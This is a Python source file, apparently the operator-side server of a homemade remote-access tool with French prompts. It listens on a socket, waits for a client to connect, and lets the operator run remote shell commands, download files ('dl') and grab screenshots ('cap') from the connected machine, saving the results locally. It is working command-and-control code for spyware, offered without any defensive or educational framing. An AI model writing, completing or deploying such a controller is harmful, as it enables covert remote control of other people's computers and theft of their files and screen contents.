import socket
import os

HOST = "127.0.0.1"
PORT = 65432
takable = 1024

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print("en attente de connection......")
    conn, addr = s.accept()
    def recever(conn, data_len):
        current_receved = 0
        t = "".encode()
        final_data = t
        while current_receved < data_len:
            left_to_take = data_len - current_receved
            if left_to_take > takable:
                left_to_take = takable
            data = conn.recv(takable)
            current_receved += len(data)
            if final_data == None:
                final_data = data
            else:
                final_data += data 
        return final_data
    def sender(socket, command):
        if not command:
            print("fait pas chier")
            return None
        else:
            socket.sendall(command.encode())
            data_len = recever(socket, 13)
            data_len = int(data_len.decode())
            data = recever(socket, data_len)
            return data
            
    with conn:
        print(f"Connected by {addr}")
        while True:
            infos = sender(conn, "infos")
            if not infos:
                break
            text = input(infos.decode() + ">>> ")
            text_split= text.split(" ")
            if len(text_split) == 2 and text_split[0] != "cd":
                f_name = ""
                match text_split[0]:
                    case "dl":
                        f_name = text_split[1]
                    case "cap":
                        f_name = text_split[1] + ".PNG"
                data = sender(conn, text)
                if not data:
                    break
                if data == b'xxxx':
                    print("Not found")
                if data == b'back':
                    os.chdir("../")
                else:
                    f = open(f_name, "wb")
                    f.write(data)
                    f.close()
            else:
                data = sender(conn, text)
                print(f"output : {data.decode()} \n")

            
        
